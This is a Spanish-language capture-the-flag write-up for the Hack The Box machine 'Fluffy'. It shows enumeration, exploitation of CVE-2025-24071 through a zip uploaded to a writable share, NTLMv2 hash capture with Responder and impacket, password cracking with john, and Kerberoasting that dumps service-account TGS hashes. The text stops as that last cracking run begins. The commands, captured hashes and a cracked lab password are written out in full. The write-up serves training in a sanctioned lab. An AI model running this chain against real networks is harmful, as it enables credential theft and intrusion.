# HTB: Fluffy - CVE-2025-24071 - Kerberos

## Host: windows
## IP: 10.10.11.69

## Procedimiento y comandos

> Se nos proveen las credenciales en la maquina

* user: ** j.fleischman **
* password: ** J0elTHEM4n1990! **

#### Paso 1: Enumeracion

* Nmap

```bash
  cat Fluffy-nmap.txt 
# Nmap 7.95 scan initiated Wed Sep 10 13:18:55 2025 as: /usr/lib/nmap/nmap -A -oN Fluffy-nmap.txt 10.10.11.69
Nmap scan report for 10.10.11.69
Host is up (0.22s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-10 23:19:15Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-09-10T23:20:45+00:00; +6h59m59s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-10T23:20:46+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-10T23:20:45+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-10T23:20:46+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s
| smb2-time: 
|   date: 2025-09-10T23:20:06
|_  start_date: N/A

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   268.49 ms 10.10.14.1
2   269.04 ms 10.10.11.69

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 10 13:20:48 2025 -- 1 IP address (1 host up) scanned in 113.25 seconds
```
* SMB:

```bash
  nxc smb 10.10.11.69 -u users.txt -p passwords.txt --continue-on-success
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
```

* SMBMAP

```bash

  smbmap -H 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                                                         
[|] Checking for open ports...
[\] Checking for open ports...                                                                         
[*] Detected 1 hosts serving SMB

[\] Enumerating shares...                                                                             [|] Enumerating shares...                                                                                                                                                                                 
[+] IP: 10.10.11.69:445 Name: 10.10.11.69               Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ, WRITE
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[/] Closing connections..                                                                             [-] Closing connections..                                                                             
```

Descargamos todos los archivos en nuestro kali y revisamos:

```bash
  impacket-smbclient fluffy.htb/j.fleischman:'J0elTHEM4n1990!'@10.10.11.69 

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Thu Sep 11 00:54:40 2025 .
drw-rw-rw-          0  Thu Sep 11 00:54:40 2025 ..
-rw-rw-rw-        365  Thu Sep 11 00:54:40 2025 documents.library-ms
drw-rw-rw-          0  Fri May 16 11:51:49 2025 Everything-1.4.1.1026.x64
-rw-rw-rw-    1827464  Fri May 16 11:51:49 2025 Everything-1.4.1.1026.x64.zip
drw-rw-rw-          0  Fri May 16 11:51:49 2025 KeePass-2.58
-rw-rw-rw-    3225346  Fri May 16 11:51:49 2025 KeePass-2.58.zip
-rw-rw-rw-     169963  Sat May 17 11:31:07 2025 Upgrade_Notice.pdf
# 
```

#### Paso 2: Acceso inicial

De todos los archivos lo unico interesante es el pdf... el cual contiene una lista de vulnerabilidades. Tambien examinamos el archivo con exiftool y encontramos otro usuario. 
Buscamos exploits publicos de las vulnerabilidades mas criticas:

* ** CVE-2025-24071 **

* Exploit 1 - [Public Exploit 1](https://github.com/ThemeHackers/CVE-2025-24071/tree/main) 

* Exploit 2 - [Public Exploit 2](https://github.com/0x6rss/CVE-2025-24071_PoC)

* ** Flow: **

1. Ejecutar el exploit que genera el .zip (en kali)

2. Cargar exploit en el share que podemos escribir, en este caso IT

3. Debemos levantar un servidor SMB para capturar cualquier intento de authenticacion

* Tools y alternativas:

1. ** impacket: **

Podemos colocar el arvhivo con impacket-smbclient y escuchar conexiones con impacket-smbserver

##### Resultados exploit 2 con impacket

* impacket-smbserver

```bash
  impacket-smbserver smbfolder IT -smb2support -user j.fleischman -password J0elTHEM4n1990!
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.69,56697)
[*] AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)
[*] Could not authenticate user!
[*] Closing down connection (10.10.11.69,56697)
[*] Remaining connections []
[*] Incoming connection (10.10.11.69,56698)
[*] AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)
[*] Could not authenticate user!
[*] Closing down connection (10.10.11.69,56698)
[*] Remaining connections []
[*] Incoming connection (10.10.11.69,56699)
[*] AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)
[*] Could not authenticate user!
[*] Closing down connection (10.10.11.69,56699)
[*] Remaining connections []
[*] Incoming connection (10.10.11.69,56700)
[*] AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)
[*] Could not authenticate user!
[*] Closing down connection (10.10.11.69,56700)
[*] Remaining connections [] 
```

* impacket-smbclient

```bash
  impacket-smbclient fluffy.htb/j.fleischman:'J0elTHEM4n1990!'@10.10.11.69
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use IT
# ls
drw-rw-rw-          0  Thu Sep 11 18:02:27 2025 .
drw-rw-rw-          0  Thu Sep 11 18:02:27 2025 ..
drw-rw-rw-          0  Fri May 16 11:51:49 2025 Everything-1.4.1.1026.x64
-rw-rw-rw-    1827464  Fri May 16 11:51:49 2025 Everything-1.4.1.1026.x64.zip
drw-rw-rw-          0  Fri May 16 11:51:49 2025 KeePass-2.58
-rw-rw-rw-    3225346  Fri May 16 11:51:49 2025 KeePass-2.58.zip
-rw-rw-rw-     169963  Sat May 17 11:31:07 2025 Upgrade_Notice.pdf
# put exploit.zip
# ls
drw-rw-rw-          0  Thu Sep 11 18:05:16 2025 .
drw-rw-rw-          0  Thu Sep 11 18:05:16 2025 ..
drw-rw-rw-          0  Fri May 16 11:51:49 2025 Everything-1.4.1.1026.x64
-rw-rw-rw-    1827464  Fri May 16 11:51:49 2025 Everything-1.4.1.1026.x64.zip
drw-rw-rw-          0  Thu Sep 11 18:05:16 2025 exploit
-rw-rw-rw-        323  Thu Sep 11 18:05:02 2025 exploit.zip
drw-rw-rw-          0  Fri May 16 11:51:49 2025 KeePass-2.58
-rw-rw-rw-    3225346  Fri May 16 11:51:49 2025 KeePass-2.58.zip
-rw-rw-rw-     169963  Sat May 17 11:31:07 2025 Upgrade_Notice.pdf
# 

```

##### Resultados exploit 2 con responder y smbclient

2. ** responder y smbclient **

Podemos colocar el exploit con smbclient y escuchar las autenticaciones con responder

* responder:

```bash
# responder
  responder -I tun1
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun1]
    Responder IP               [10.10.14.218]
    Responder IPv6             [dead:beef:2::10d8]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-MFXFFSTLGTW]
    Responder Domain Name      [DMJC.LOCAL]
    Responder DCE-RPC Port     [47250]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...
```

* smbclient

```bash
  smbclient -U 'fluffy.htb/j.fleischman%J0elTHEM4n1990!' //10.10.11.69/IT
Try "help" to get a list of possible commands.
smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (0.5 kb/s) (average 0.5 kb/s)
smb: \> 
```

* Luego en el responder:

```bash
[+] Listening for events...                                                                     

[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:f43106573a748b4b:CE55E469AF37C4EB7C5B51A8A0E77960:0101000000000000807E7E710B23DC01A2D5730A8EFDB6A2000000000200080055004D004600410001001E00570049004E002D003600530046004C0057004E004D00380053004400550004003400570049004E002D003600530046004C0057004E004D0038005300440055002E0055004D00460041002E004C004F00430041004C000300140055004D00460041002E004C004F00430041004C000500140055004D00460041002E004C004F00430041004C0007000800807E7E710B23DC0106000400020000000800300030000000000000000100000000200000FF79F06A02686C8F37D1320F56FBDBED3CD5A9B13E6D2703DDF9CE61478579520A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200310038000000000000000000
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila                                                      
[*] Skipping previously captured hash for FLUFFY\p.agila                                                      
[*] Skipping previously captured hash for FLUFFY\p.agila                                                      
[*] Skipping previously captured hash for FLUFFY\p.agila 
[+] Exiting... 
```
> **Importante** El exploit 1 aparentemente tambien da resultados, pero ** no con impacket.** Esta ultima no es viable en este caso como toolkit.

Una vez obtenido el hash buscamos alternativas para crackearlo:

* Guardamos

```bash
  echo "p.agila::FLUFFY:f43106573a748b4b:CE55E469AF37C4EB7C5B51A8A0E77960:0101000000000000807E7E710B23DC01A2D5730A8EFDB6A2000000000200080055004D004600410001001E00570049004E002D003600530046004C0057004E004D00380053004400550004003400570049004E002D003600530046004C0057004E004D0038005300440055002E0055004D00460041002E004C004F00430041004C000300140055004D00460041002E004C004F00430041004C000500140055004D00460041002E004C004F00430041004C0007000800807E7E710B23DC0106000400020000000800300030000000000000000100000000200000FF79F06A02686C8F37D1320F56FBDBED3CD5A9B13E6D2703DDF9CE61478579520A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200310038000000000000000000" > agila.hash
```
* Utilizamos john:

```bash
  john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 agila.hash
Warning! john.conf section [list.rules:sshrules] is multiple declared.
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
prometheusx-303  (p.agila)     
1g 0:00:00:04 DONE (2025-09-11 11:31) 0.2100g/s 949136p/s 949136c/s 949136C/s prrm30w..programmercomputer
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

* Observamos el password:

```bash
  john --show agila.hash                                                        
Warning! john.conf section [list.rules:sshrules] is multiple declared.
p.agila:prometheusx-303:FLUFFY:f43106573a748b4b:CE55E469AF37C4EB7C5B51A8A0E77960:0101000000000000807E7E710B23DC01A2D5730A8EFDB6A2000000000200080055004D004600410001001E00570049004E002D003600530046004C0057004E004D00380053004400550004003400570049004E002D003600530046004C0057004E004D0038005300440055002E0055004D00460041002E004C004F00430041004C000300140055004D00460041002E004C004F00430041004C000500140055004D00460041002E004C004F00430041004C0007000800807E7E710B23DC0106000400020000000800300030000000000000000100000000200000FF79F06A02686C8F37D1320F56FBDBED3CD5A9B13E6D2703DDF9CE61478579520A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200310038000000000000000000

1 password hash cracked, 0 left
```

* Propagamos las credenciales por winrm y smb:

```bash
  nxc winrm 10.10.11.69 -u users.txt -p passwords.txt --continue-on-success
WINRM       10.10.11.69     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\j.fleischman:J0elTHEM4n1990!
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\p.agila:J0elTHEM4n1990!
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\j.fleischman:prometheusx-303
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\p.agila:prometheusx-303

  nxc smb 10.10.11.69 -u users.txt -p passwords.txt --continue-on-success
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.10.11.69     445    DC01             [-] fluffy.htb\p.agila:J0elTHEM4n1990! STATUS_LOGON_FAILURE 
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
```

* Buscamos informacion que nos resulte reelevante con bloodhound

**Bloodhound**
```bash
bloodhound-python -u 'j.fleischman' -p 'J0elTHEM4n1990!' -d fluffy.htb -c All -ns 10.10.11.69 --zip
```

Buscamos usarios kerberosteables encontramos tres:

```bash
  impacket-GetUserSPNs -outputfile kerberostables.txt fluffy.htb/p.agila:'prometheusx-303' -dc-ip 10.10.11.69                         
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------
ADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 13:07:50.136701  2025-09-11 17:30:24.988097             
LDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 13:17:00.599545  <never>                                
WINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-05-17 21:51:16.786913  2025-05-19 12:13:22.188468             



[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

> [Troubleshouting kerberos SessionError](https://forum.hackthebox.com/t/how-do-you-synchronize-ad-and-time/318340)

```bash
  ntpdate 10.10.11.69
2025-09-12 00:19:18.647724 (-0300) +25197.717625 +/- 0.109776 10.10.11.69 s1 no-leap
CLOCK: time stepped by 25197.717625
```

* Volvemos a ejecutar:

```bash
  impacket-GetUserSPNs -outputfile kerberostables.txt fluffy.htb/p.agila:'prometheusx-303' -dc-ip 10.10.11.69 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------
ADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 13:07:50.136701  2025-09-11 17:30:24.988097             
LDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 13:17:00.599545  <never>                                
WINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-05-17 21:51:16.786913  2025-05-19 12:13:22.188468             

[-] CCache file is not found. Skipping...

```

* kerberostables.txt

```bash
  cat kerberostables.txt     
$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$03e842b9152b8d2948f7cd3c5ba61c8b$1694959064dd505d47e1ed57a9334ef237761e25d4e607cd572748707cacdfe2c4a67abe8b944a5efa7b5d3f887d3430f098217e6418fd5b0080ccb40ab5523629624dcd3114f60d4c1fa940a720467342816a3d8f331432d6d36820fb43f592af9da4c2930a66bb5f854877e607685c119e8dfb2e95736cff2ab25993abf72ddde9cf830b938d047ac2b351f4a703117a38dcedf4db56f4805cf690d98844d83070fcadb0b288f42ad8f0bb9f67da6f07b1508323dca90fb36ad7fd515628c0b8cab222d8baecfc6d1d3b1c714568429527c140e925625d09ae356bb8bf8a016eb0801dc9264dd711cd01bd54a5186335824a66c3bde19c27f920f90480105c407e0c13bc7e9ba90613ac1a61c53886768cde9cfa0c8295261a1cc8ad2feb31b53d9f718219869a3aee81763f27aab7a4258a83fd3c7f01a17e77668fe39ce6c3a6cfce1a3e1161e6abb7100398157d7093ff1c73f2c6ec5df90192e626c27d657e307bc167f04dc69542824ec4b5b05eca2cb1ce13791bcc57c1c9588447ce0a94cfb0dc24f13e8b23fa97dbe3757aa89f887a31fbe680def83c131c2fd3d0898a922c43a8baf24d239303a85dabf2d04fcfcaa72eebed7fcbc9e4fd09fef100bf817d73e36d35b84f28be9dcc0be268840e04349e4028050f7c8510af327faf68ff09d7fe4c55f9b8248e7daae47ebb60c58d9a253a7c9802bba2fd675b14de59f21de297d421b62a50ef3a2d436b195ca3f15420679630d3583b0f5f0704b05fe4669f6a8e106878727fa1246ac5eb76d2a011baeccd3793c46b92338cea3a50900a8453a02f252eb1a33ebf57fecb94f04575d188793508c66bc167b2d635ef33b21ba09edf97ab34584ba50d7b889bbda165f4f207700164b2b3d42b3d6a12ef278da48296c4561f4be230536552c60f0362334fc7f48334e6f6228617d894844e77310e2c5a6f068eefc64f60b1a0c449dc3d6d551b977c34935f67577ae4ee700f89d69f670f6187e7f03c81b81a56a6038c01ff8d7d0c74f22e4ac0f55bc03bb63c5e0ef65bc49fe65caba817d998f85fae38c2f7835edf29b3c9ee78216e021833b4a16e9e5679c006235abbc7e716963805f5803be78b8327bb4186f871bc5f61b64ec6a28b374eb4c381b9e5a2acaf077b0394d1ddfda6b3da14a522537f7c24635980c578a71ee8afa1d477bfd05ffad88ea289af0968cd2f20c49364a35bfafb312618d31b7660ae5f351fed21839dd8de85e9d85972db32e0f0cb9ddb0be724737f0896267568fa72025476e085c36bf1e9bf8d38fd4af007971ceab6c41c799f9d497a36590d541f700754ed00fc0a31c424e754a4a42cbaeaa31e15f0b0d4b5c94b579fb2489b28c334a70c76a6122db274ca09bc30333711f0d46f5163e8b19e5ac6d02fa06364180fd88c3b1dc7faf661ca055627c172833eb958f3e526d9d2e9a4e1e662d4f49cedad390f88cb2bcf6455faaef6864c2576
$krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb/ldap_svc*$e4803acb8302f900c3885b76644c4d48$e8fed1191b1e4f5d0057b9e9fa2a2b07ee3a94ce2cf29eb25399b9b9115b98f9abcd3b38487412bccc577aef4f8d0f594c9d2e80d76c5e7f00bd98da31571cddb53b9baf1b70f09eea8f4682ed3bbf29b82b5927291e28b90240b6d701731ca4bbdc0bef60c6fc67df9b23ad3a61116349d20cf667bf961531c61968451349338a12a9e8662adcb46c7fed78982c174a600349bab9388bf99cda411b8b12045ecb676696da5c2c7237439d17acb428d2c1b95e293947bef7e5de2f8f9f2d0bc6e562cc3999275a99767098f51bddd4700b109a1d0929a5b4e4ce31a9d3cd563c87e06d302a463e14897879afd8c8b914f1caa60dcced6703e59a490e4d300bc341cd1d6450f5f894254774aa59adc8a49f0f673dd6180982036effce5b3110f69c6ef369449d72ccbae29def2b977c4efe6f86aabc733bb64781017eaa5d9f2740edbf9328cbbef2cdb5732f0e7bad75f2f05f98e77ca0cba0ba56ca2e57bdfef15f6d4013ce36eaa268bb188a5cfe9b3589e52aa1ff0426a38c73e1390932dcdbb1856a4aa7c32f89ed718917b2ef5f81ce93bb716109b2a388ed73cb53908b1e4a79543122a0bb5b5ddc273ad2a40d46e5d2c834e6f23eb2b4231a73aac38d7505a5bcb4e4f8c48aa15c2d7f0782c4e4c1df6ee46ebcb2dcdfa5b0dbc2fe7a83931b9d5ef7dc389b85733ab1067c21e779cad4c15b1fe1c0ec2cf5931ea0f40e5436ad5ab24a597d445f6b7801af4c0a00d2fc2b3f774f471a4ec7bbd82f6de2c0f7770e900349527238345224191bd24c8481094641dfdd1f2d2c529a9ba9b058120c88e062a40aaabe868816a0744a34f0ad352776528ef6a6c5daee612051f2743ea4647a1ae3b219520b5750f83a8c5e6dd04b20da2e32ecd9e271f05e6f8a6047a9430b6fd194b2252e061109fd54cc05b9103a09b3d6e4e8b590e805c912b2c7bbb820cb822420e5a0cdc7dffaf9a9ced6a37c08e322ccaea9f3755039f9c5d1a2968a6033b0b4b3d1298f3432dfb0e6689d32b73fb437de58936ddeecf1a248c56186a8d5128bc2831c0b2e8effa09a158fbf01b062dfd556178a78de299a1cfc5a7dbf8787173c497304d6e202dbafef207db9fd659fca47fa8c05b30f34ebe48981079dca723f2e8524790c58ac81883c2151ce0e7a851e9cf35bf4ae0112934d6176bfc795b6c70881264b0b631fbd8923045dc45d531dce5124979ff791f502d3fa10ff24ef76fe94705cd33b044aafe7d89e03447c12266f789652e95ee381ed7ad7f4dacf8778ea022168eeb3494181f73ac572ae77d9e57d826c37b2201068b3735a06ee1615e31c80d260d7dcbc657810362e3835fa0e160a6da5db688cee602ab997b8c82ed7264964468ebc01fdd04d0de8ac643c602132f4fae874fcb77dfc09d7db1c34ecf69ad3e4aa708f927ef3f22bab95fd842d9dbf3791faa03560548cf85294443fca44be6bebbc3a0514e1f31ccdf32cbf48d963
$krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb/winrm_svc*$60e79606598fc8739d4ebba783b1c181$9a041d344e8fcf01e3ecd4032f86bc8f087e6e63eaa9e2b493fe9d0262189f613a19637b5c1f5f29b9f1e0f9193a03319f159374786c24cce74bbe77c26c3e17acd19d56ea7cdf42d71826ee25ab1394bbf7ab15ca64607828a29bcf7aa432ea6f5c6b6064ee43781f5183a332ded538b09e3b60d0c31b015cda461fb3d5af081423abf2fa9f00746cc00430ebff51c31d8c3040d9a3c482835fc95e1477f42af007c84f55a8319d29326573f34219c8e15e8168343c6efea7ce0d7eca59c5699c9dd74acb77cf0dc73a47cc863a64f9565f06d85eac5b3f7599605c51a14f5f6737020781c18b17fdc0b4f2f1ff431e5c67dea9750940fdd6c0c6b8a06544c9f5ad6a62436a05b95715e3acc2aba87e558915afd72804b358c55f2d1de85b3e20ea794234a86d2a72c95d2e7959fb4c185eabb4eebacc8233d77b1baa288b0ba3fb32d06c579c33267fd262a3f5ce6e756fdac82c33415db771ab0e46560b1ec07916764807894a544a7f88dd1966ad46723cca604b93a664f8d70ff4eba64774eec7950ab5d93c61485743049b57687cc3b5b8b3868cf65f99ded05abdb88cf17bebd8b76ac5b79a11bbeb432f43d79cdd38fab0e21fbde751b5dc662d9f0316f5b9ad74540481bba5de3d3391c9b5e73efc1267cab1f3093061722ae1e1cd12018eedcc9ff3ed3688a056fc35492e357fd02bcc4707220b1c910e38921e8ee586def4aa3fd44f93a2960a641bc217ded9eddf6aa8e8f4e07663b563f6bf35354a2199f27933f51f922059fc12e06b2bdcf2d7ce6f462eaf14e0b3a01d66e60fc31b5562bee3b78e4443c1bd2c7104a81f53a78b10cf2a0cfe109182f0c3ffa821aabbff8579762dadaddf314073794299cf7e6d1dd672ca29819f9dcb6edf11f102b54b95314c6f7f5f1340ad9ef2844cc00613277aa2dafc7bd9e9c64e904bcb2cf4059676f7682bbfce7a4104e849fc243230d2c493fb6f2ede27a277ce6d2b5f40d61524b5ef9b1ed0cb7471e2db988d9676f0630475cc4325ac3dadbe78a49a0963ba1bab4cbbfaedb197433099e3fbb0a09bcdcd211de5d3b1a7e25b1788120978f3ab7888aa959aa0403caf8d9d2ff428da017d94b88828de110786e45feebb2f16100b8072940a0d4beefe9019f8d965e55c0b8615ca82bb565543cfc5908980d97529d4cd7742af3eaf8b27a6bd8396e2ca4c38b7fd1aa8e4d5fe998189093488a4f937f81b6e99ee3f9851931adaf31d6db79fd1fe70251949df64b1c683d5877b8b6c8fd37a88c96f2ddb6e84f7f57f9e8ad3fcc1237a6faad6463e75ae0a9692eb6de466bb923ace706bba2e914c456d1e33d7f862a88a64ac1765757543a3fcdf1929b11e9f675c3702c78dd5404b7275f78c248bd2ac0df1b02bd1a379bd4515da8e74c1b4597987c08c841cba9711f552b72328b328c614d617f8abf297266d512c461e54da7904b9b71bebea9b4c8cade3d5812fdea20a46a8
```
* Intentamos Crackear los hashes:

```bash
  john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberostables.txt 
Warning! john.conf section [list.rules:sshrules] is multiple declared.
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
